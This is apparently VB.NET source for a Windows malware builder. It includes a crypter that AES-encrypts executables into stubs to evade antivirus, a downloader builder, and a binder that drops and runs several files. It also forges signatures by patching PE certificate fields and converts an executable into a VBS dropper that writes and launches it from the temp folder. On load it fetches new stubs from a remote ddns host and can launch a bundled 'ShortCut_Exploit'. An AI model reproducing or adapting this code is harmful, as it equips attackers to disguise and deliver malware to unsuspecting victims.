﻿Imports System.ComponentModel
'Get stubs here :)
'http://www.codeproject.com/KB/vb/#Visual+Basic+.NET


Public Class Form1
    Dim CurrentStub As String = ""
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim OFD As New OpenFileDialog
        With OFD
            .FileName = ""
            .Title = "Select file to crypt"
            .ShowDialog()
        End With
        If OFD.FileName <> "" Then
            TextBox1.Text = OFD.FileName
        End If
    End Sub

    Function Base64Encode(ByVal TheStr As String) As String
        Dim bytesToEncode As Byte()
        bytesToEncode = System.Text.Encoding.UTF8.GetBytes(TheStr)
        Dim encodedText As String
        encodedText = Convert.ToBase64String(bytesToEncode)
        Return encodedText
    End Function
    Private Function TringToUnicodeBytes(ByVal TheStr As String) As Byte()
        Return System.Text.Encoding.Unicode.GetBytes(TheStr)
    End Function

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Dim StubPath As String = Application.StartupPath & "\stubs\" & CurrentStub
        Dim Stub() As Byte
        If TextBox1.Text = "" Then Exit Sub
        ' 
        If CurrentStub = "" Then
            Dim OFD As New OpenFileDialog
            With OFD
                .Title = "Select Stub"
                .InitialDirectory = Application.StartupPath & "\stubs"
                .ShowDialog()
            End With
            If OFD.FileName <> "" Then
                Stub = FileIO.FileSystem.ReadAllBytes(OFD.FileName)
            Else
                MsgBox("must select stub")
                Exit Sub
            End If
        Else
            Stub = FileIO.FileSystem.ReadAllBytes(Application.StartupPath & "\stubs\" & CurrentStub)
        End If

        Dim SFD As New SaveFileDialog
        With SFD
            .FileName = ""
            .Title = "Save Crypted File As"
            .ShowDialog()
        End With
        If SFD.FileName <> "" Then
            FileIO.FileSystem.WriteAllBytes(SFD.FileName, Stub, False)
            If CheckBox1.Checked = True Then
                Dim TestDialog As New FrmClone
                TestDialog.TextBox2.Text = SFD.FileName
                If TestDialog.ShowDialog(Me) = System.Windows.Forms.DialogResult.OK Then
                End If
                TestDialog.Dispose()
            End If

            If IsNetApp(TextBox1.Text) Then
                FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("T"), True)
            Else
                FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("F"), True)
            End If
            FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("!@!"), True)

            FileIO.FileSystem.WriteAllBytes(SFD.FileName, AES_Encrypt(FileIO.FileSystem.ReadAllBytes(TextBox1.Text)), True)
            FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("!@!"), True)
            Application.DoEvents()
            System.Threading.Thread.Sleep(50)

            'replace EOF data
            Dim OverLay() As Byte = ReadEOFData(TextBox1.Text)
            If OverLay Is Nothing Then
            Else
                FileIO.FileSystem.WriteAllBytes(SFD.FileName, OverLay, True)
            End If
            If CheckBox2.Checked = True Then
                SignFile(SFD.FileName)
            End If

            MsgBox("Saved As: " & SFD.FileName)

        End If

    End Sub

    Function IsNetApp(ByRef TheFile As String)
        Dim Result As String
        Try
            Result = System.Reflection.AssemblyName.GetAssemblyName(TextBox1.Text).ToString
        Catch ex As Exception
            Return False
        End Try
        Return True
    End Function

    Public Function ReadEOFData(ByRef FilePath As String) As Byte()
        Dim Bin() As Byte = FileIO.FileSystem.ReadAllBytes(FilePath)
        Dim i As Integer = Bin.Length - 1
        Dim Found As Boolean = False
        Dim Found2 As Boolean = False
        Dim Found3 As Boolean = False

        Do Until i = 0
            If Bin(i) = &H0 Then
                If Found = False Then
                    Found = True
                Else
                    If Found2 = False Then
                        Found2 = True
                    Else
                        If Found3 = False Then
                            'exit function
                            i += 3
                            Exit Do

                        End If
                    End If
                End If
            Else
                Found = False
                Found2 = False
                Found3 = False
            End If
            i -= 1
        Loop

        Dim Size As Integer = (Bin.Length - 1) - i
        Dim OverLay(0 To Size) As Byte
        If OverLay.Length = 0 Then Return Nothing
        Dim a As Integer = 0
        Do Until i = Bin.Length - 1
            OverLay(a) = Bin(i)
            i += 1
            a += 1
        Loop
        Return OverLay
    End Function


    Public Shared Function Compress(bytes As Byte()) As Byte()
        Dim stream = New IO.MemoryStream()
        Dim zipStream = New IO.Compression.DeflateStream(stream, IO.Compression.CompressionMode.Compress, True)
        zipStream.Write(bytes, 0, bytes.Length)
        zipStream.Close()
        Return stream.ToArray()
    End Function
    Sub SignFile(ByVal TheFile As String)
        Dim TheBinToSign() As Byte = FileIO.FileSystem.ReadAllBytes(TheFile)
        Dim TheCert() As Byte = My.Resources.DigitalCert

        Dim NewBin(0 To TheBinToSign.Length + TheCert.Length - 1) As Byte
        Dim l As Integer = 0
        For i = 0 To TheBinToSign.Length - 1
            NewBin(i) = TheBinToSign(i)
            l = i
        Next
        Dim a As Integer = 0
        For i = (l + 1) To TheBinToSign.Length + TheCert.Length - 2
            NewBin(i) = TheCert(a)
            a += 1
        Next


        'add the pe infoz
        Dim AddressToPE As Integer
        Dim Found1 As Boolean = False
        Dim ix As Integer = 0
        For Each Byt In NewBin
            If Found1 = True And Byt = &H45 Then
                AddressToPE = ix - 1
                Exit For
            Else
                Found1 = False
            End If
            If Byt = &H50 Then Found1 = True
            ix += 1
        Next
        '  TextBox2.Text = "Address To PE: " & Hex(AddressToPE) & Environment.NewLine

        Dim Prt1 As Byte = TheBinToSign(AddressToPE + 4)
        Dim AddressToSection As Integer
        If Prt1 = &H4C Then
            'x32
            AddressToSection = AddressToPE + 152
        Else
            'x64
            AddressToSection = AddressToPE + 168
        End If

        'Dim AddressToSection As Integer = AddressToPE + 152 '168 for x64
        Dim TheInjection As String = Hex(TheBinToSign.Length)
        Dim TheInjectionSize As String = Hex(TheCert.Length)


        Do Until TheInjection.Length = 8
            TheInjection = "0" & TheInjection
        Loop

        Do Until TheInjectionSize.Length = 8
            TheInjectionSize = "0" & TheInjectionSize
        Loop
        Dim hexString As String = TheInjection

        Dim Byte1 As Byte = Convert.ToByte(hexString.Substring(6, 2), 16)
        Dim Byte2 As Byte = Convert.ToByte(hexString.Substring(4, 2), 16)
        Dim Byte3 As Byte = Convert.ToByte(hexString.Substring(2, 2), 16)
        Dim Byte4 As Byte = Convert.ToByte(hexString.Substring(0, 2), 16)


        NewBin(AddressToSection) = Byte1
        NewBin(AddressToSection + 1) = Byte2
        NewBin(AddressToSection + 2) = Byte3
        NewBin(AddressToSection + 3) = Byte4

        hexString = TheInjectionSize

        Byte1 = Convert.ToByte(hexString.Substring(6, 2), 16)
        Byte2 = Convert.ToByte(hexString.Substring(4, 2), 16)
        Byte3 = Convert.ToByte(hexString.Substring(2, 2), 16)
        Byte4 = Convert.ToByte(hexString.Substring(0, 2), 16)

        NewBin(AddressToSection + 4) = Byte1
        NewBin(AddressToSection + 5) = Byte2
        NewBin(AddressToSection + 6) = Byte3
        NewBin(AddressToSection + 7) = Byte4
        FileIO.FileSystem.WriteAllBytes(TheFile, NewBin, False)
    End Sub
    Public Shared Function AES_Encrypt(ByVal input() As Byte) As Byte()
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes("password"))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = Security.Cryptography.CipherMode.ECB
            Dim DESEncrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateEncryptor
            Dim encrypted() As Byte = DESEncrypter.TransformFinalBlock(input, 0, input.Length)
            Return encrypted
        Catch ex As Exception
            Return Nothing
        End Try

    End Function


    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ListView1.Columns.Add("File Name", 100, HorizontalAlignment.Center) 'Column 1
        ListView1.Columns.Add("File Path", 100, HorizontalAlignment.Center) 'Column 2
        ListView1.Columns.Add("Execute", 100, HorizontalAlignment.Center) 'Column 3
        ListView1.Columns.Add("Drop Path", 100, HorizontalAlignment.Center)

        'checking for stub update
        Dim Wc As New Net.WebClient
        Dim Restult As String = ""
        Try
            Restult = Wc.DownloadString("http://intellisence.ddns.net/crypter/index.php")
        Catch ex As Exception
            Exit Sub
        End Try

        CurrentStub = Restult
        If FileIO.FileSystem.DirectoryExists("stubs") Then
            'loop through the files and see if current stub exists
            Dim di As New IO.DirectoryInfo(Application.StartupPath & "\stubs\")
            Dim diar1 As IO.FileInfo() = di.GetFiles()
            Dim dra As IO.FileInfo

            'list the names of all files in the specified directory
            For Each dra In diar1
                If dra.ToString.Contains(Restult) Then Exit Sub
            Next
            'if not download new stub
            MsgBox("Stub update found! Downloading stub!")
            FileIO.FileSystem.WriteAllBytes(Application.StartupPath & "\stubs\" & Restult, Wc.DownloadData("http://intellisence.ddns.net/crypter/" & Restult), False)
            MsgBox("Stub update success!")
        Else
            MsgBox("Stub update found! Downloading stub!")
            FileIO.FileSystem.CreateDirectory("stubs")
            FileIO.FileSystem.WriteAllBytes(Application.StartupPath & "\stubs\" & Restult, Wc.DownloadData("http://intellisence.ddns.net/crypter/" & Restult), False)
            MsgBox("Stub update success!")
        End If

    End Sub

    Private Function Bytes_To_String2(ByVal bytes_Input As Byte()) As String
        Dim strTemp As New System.Text.StringBuilder(bytes_Input.Length * 2)
        For Each b As Byte In bytes_Input
            strTemp.Append(Conversion.Hex(b))
        Next
        Return strTemp.ToString()
    End Function
    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Dim Ofd As New OpenFileDialog
        With Ofd
            .Title = "Select file to add"
            .FileName = ""
            .ShowDialog()
        End With
        If Ofd.FileName <> "" Then
            Dim FilePath As String = Ofd.FileName
            Dim Execute As String = ""
            Dim PrePath As String = Strings.Left(FilePath, FilePath.LastIndexOf("\") + 1)
            Dim FileName As String = Replace(Ofd.FileName, PrePath, "")
            Dim answer = MsgBox("Execute file?", vbYesNo, "Execute File?")
            If answer = vbYes Then
                Execute = "True"
            Else
                Execute = "False"
            End If
            '  ListBox1.Items.Add(Cmds)

            Dim str(3) As String
            Dim itm As ListViewItem
            str(0) = FileName
            str(1) = FilePath
            str(2) = Execute
            str(3) = ComboBox1.Text

            itm = New ListViewItem(str)
            ListView1.Items.Add(itm)
        End If
    End Sub

    Function Base64EncodeString(ByVal InputText As String)
        Dim bytesToEncode As Byte()
        bytesToEncode = System.Text.Encoding.UTF8.GetBytes(InputText)

        Dim encodedText As String
        encodedText = Convert.ToBase64String(bytesToEncode)
        Return encodedText
    End Function

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        Dim Bin() As Byte = My.Resources.DwnldrStub

        Dim BytesToWrite() As Byte = System.Text.Encoding.Unicode.GetBytes("!~!" & Base64EncodeString(TextBox2.Text) & "!~!")

        Dim Found1 As Boolean = False
        Dim Found2 As Boolean = False
        Dim Found3 As Boolean = False
        Dim CurrentPosition As Integer = 0
        For Each byt In Bin
            If Found1 = False Then
                If byt = &H58 Then
                    Found1 = True
                End If
            Else
                If Found2 = False Then
                    If byt = &H0 Then
                        Found2 = True
                    Else
                        Found1 = False
                    End If
                Else
                    If Found3 = False Then
                        If byt = &H58 Then
                            Found3 = True
                            CurrentPosition = CurrentPosition - 2
                            Exit For
                        Else
                            Found2 = False
                            Found1 = False
                        End If
                    End If
                End If
            End If
            CurrentPosition += 1
        Next

        Dim CurPos As Integer = 0
        For Each byt In BytesToWrite
            Bin(CurrentPosition + CurPos) = BytesToWrite(CurPos)
            CurPos += 1
        Next
        Dim SFD As New SaveFileDialog()
        With SFD
            .Title = "Save As"
            .FileName = "downloader.exe"
            .ShowDialog()
        End With
        FileIO.FileSystem.WriteAllBytes(SFD.FileName, Bin, False)
        If CheckBox3.Checked = True Then
            Dim TestDialog As New FrmClone
            TestDialog.TextBox2.Text = SFD.FileName
            If TestDialog.ShowDialog(Me) = System.Windows.Forms.DialogResult.OK Then
            End If
            TestDialog.Dispose()
        End If

        If CheckBox6.Checked = True Then
            SignFile(SFD.FileName)
        End If
        MsgBox("Saved As " & SFD.FileName)
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click

        Dim AppendBytes() As Byte = {}
        Dim SFD As New SaveFileDialog
        With SFD
            .FileName = ""
            .Title = "Save As"
            .ShowDialog()
        End With
        If SFD.FileName = "" Then Exit Sub
        'write the stub
        FileIO.FileSystem.WriteAllBytes(SFD.FileName, My.Resources.BndrStub, False)
        If CheckBox4.Checked = True Then
            Dim TestDialog As New FrmClone
            TestDialog.TextBox2.Text = SFD.FileName
            If TestDialog.ShowDialog(Me) = System.Windows.Forms.DialogResult.OK Then
            End If
            TestDialog.Dispose()
        End If
        Dim tst() As String = {}
        For xc = 0 To ListView1.Items.Count - 1
            Dim LstVitm As ListViewItem = ListView1.Items.Item(xc)
            Dim FileName As String = LstVitm.SubItems(0).Text
            Dim FilePath As String = LstVitm.SubItems(1).Text
            Dim Exec As String = LstVitm.SubItems(2).Text
            Dim DropPath As String = LstVitm.SubItems(3).Text
            Dim Execute As Boolean = Boolean.Parse(Exec)
            Dim Bin() As Byte = FileIO.FileSystem.ReadAllBytes(FilePath)
            Bin = AES_Encrypt(Bin)
            Dim SplitChar() As Byte = TringToUnicodeBytes("!(!(!" & Execute & "!(!(!" & DropPath & "!(!(!" & FileName & "!(!(!")
            FileIO.FileSystem.WriteAllBytes(SFD.FileName, SplitChar, True)
            FileIO.FileSystem.WriteAllBytes(SFD.FileName, Bin, True)
            Dim SplitCharz() As Byte = TringToUnicodeBytes("!(!(!")
            FileIO.FileSystem.WriteAllBytes(SFD.FileName, SplitCharz, True)
        Next
        If CheckBox5.Checked = True Then
            SignFile(SFD.FileName)
        End If
        MsgBox("Saved As " & SFD.FileName)
    End Sub

    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        FileIO.FileSystem.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\AV.exe", My.Resources.Exidous_AV_Checker, False)
        Dim TI As New System.Threading.Thread(AddressOf LaunchProcess)
        TI.Name = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\AV.exe"
        TI.Start()
    End Sub

    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
        FileIO.FileSystem.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Shortcut.exe", My.Resources.ShortCut_Exploit, False)
        Dim TI As New System.Threading.Thread(AddressOf LaunchProcess)
        TI.Name = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Shortcut.exe"
        TI.Start()
    End Sub

    Sub LaunchProcess()
        Dim ProcPath As String = System.Threading.Thread.CurrentThread.Name
        Process.Start(ProcPath).WaitForExit()
        Try
            FileIO.FileSystem.DeleteFile(ProcPath)
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button8_Click(sender As Object, e As EventArgs) Handles Button8.Click
        Dim OFD As New OpenFileDialog
        With OFD
            .FileName = ""
            .Title = "Select exe"
            .ShowDialog()
        End With
        If OFD.FileName <> "" Then
            Dim SFD As New SaveFileDialog
            With SFD
                .FileName = "lol.vbs"
                .Title = "Save As vbs"
                .ShowDialog()
            End With
            Dim tmp2 As String

            tmp2 = createScript1(FileIO.FileSystem.ReadAllBytes(OFD.FileName))
            FileIO.FileSystem.WriteAllText(SFD.FileName, tmp2, False, System.Text.Encoding.ASCII)
            MsgBox("Saved as " & SFD.FileName)
        End If

    End Sub

    Public Function createScript1(sit) As String
        Dim divs = Int(UBound(sit) / 60)
        Dim Test(0 To sit.length - 1) As String
        For i = 0 To sit.length - 1
            Test(i) = Hex(sit(i))
            If Test(i).Length = 1 Then Test(i) = "0" & Test(i)
            Test(i) = Test(i)
        Next

        Dim j As Integer
        For i = 1 To divs
            j = i * 60
            Test(j) = Test(j) & """" & vbCrLf & "t=t&"""
        Next
        Dim sData = "t=""" & Join(Test, ",") & """" & vbCrLf

        Dim depress = "\ntmp = Split(t, \q,\q)\nSet fso = CreateObject(\qScripting.FileSystemObject\q)\n" _
         & "pth = \q*****\q\nSet f = fso.CreateTextFile(pth, ForWriting)\n" _
         & "For i = 0 To UBound(tmp)\n\tl = Len(tmp(i))\n\tb = Int(\q&H\q & Left(tmp(i), 2))\n" _
         & "\tIf l > 2 Then\n\t\tr = Int(\q&H\q & Mid(tmp(i), 3, l))\n\t\tFor j = 1 To r\n\t\t" _
         & "f.Write Chr(b)\n\t\tNext\n\tElse\n\t\tf.Write Chr(b)\n\tEnd If\nNext\nf.Close\n"
        depress = depress & "WScript.CreateObject(\qWScript.Shell\q).run(pth)"
        depress = br(depress)
        Dim exeName = "fso.getspecialfolder(2) & ""\" & "lol.exe" & """"
        depress = Replace(depress, """*****""", exeName)
        Return sData & depress & vbLf & "WScript.CreateObject(""WScript.Shell"").run(pth)"
    End Function

    Public Function br(it)
        Dim tmp = Replace(it, "\n", vbCrLf)
        tmp = Replace(tmp, "\t", vbTab)
        tmp = Replace(tmp, "\q", """")
        Return tmp
    End Function
End Class
